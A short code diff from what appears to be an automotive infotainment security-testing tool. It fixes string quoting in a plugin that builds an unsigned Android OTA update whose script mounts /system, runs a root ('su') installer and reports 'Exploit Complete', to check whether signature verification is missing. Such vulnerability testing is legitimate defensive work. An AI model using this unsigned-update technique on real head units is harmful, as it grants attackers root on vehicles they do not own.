@@ -32,12 +32,12 @@ class USBUnsignedUpdatePlugin(IVIVulnerabilityPlugin):
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
                 # 典型的 Android OTA Updater-Script
                 script = (
-                    b"ui_print(\\"* * * AutoSec-Guard Unsigned OTA Test * * *\\");\\n"
-                    b"ui_print(\\"If you see this, signature verification is BYPASSED or MISSING!\\");\\n"
-                    b"mount(\\"ext4\\", \\"EMMC\\", \\"/dev/block/bootdevice/by-name/system\\", \\"/system\\");\\n"
-                    b"run_program(\\"/tmp/install/bin/su_installer.sh\\");\\n"
-                    b"unmount(\\"/system\\");\\n"
-                    b"ui_print(\\"Exploit Complete.\\");\\n"
+                    b'ui_print("* * * AutoSec-Guard Unsigned OTA Test * * *");\n'
+                    b'ui_print("If you see this, signature verification is BYPASSED or MISSING!");\n'
+                    b'mount("ext4", "EMMC", "/dev/block/bootdevice/by-name/system", "/system");\n'
+                    b'run_program("/tmp/install/bin/su_installer.sh");\n'
+                    b'unmount("/system");\n'
+                    b'ui_print("Exploit Complete.");\n'
                 )
                 
                 # Omit CERT.RSA and CERT.SF (or use public test-keys which we simulate missing)
